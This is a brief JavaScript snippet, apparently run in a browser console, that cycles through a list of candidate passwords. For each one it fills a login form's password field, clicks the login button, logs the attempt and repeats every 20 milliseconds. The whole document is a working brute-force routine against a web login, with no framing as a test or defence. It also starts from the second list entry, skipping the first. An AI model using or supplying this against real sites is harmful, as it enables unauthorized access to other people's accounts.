let index = 1;
function tryCombinations(combinations) {
    console.log('Trying Password', combinations[index]);
    password.type = 'text';
    password.value = combinations[index];
    loginButton.click();
    index++;
    if (index < combinations.length) {
        setTimeout(tryCombinations, 20, combinations);
    }
}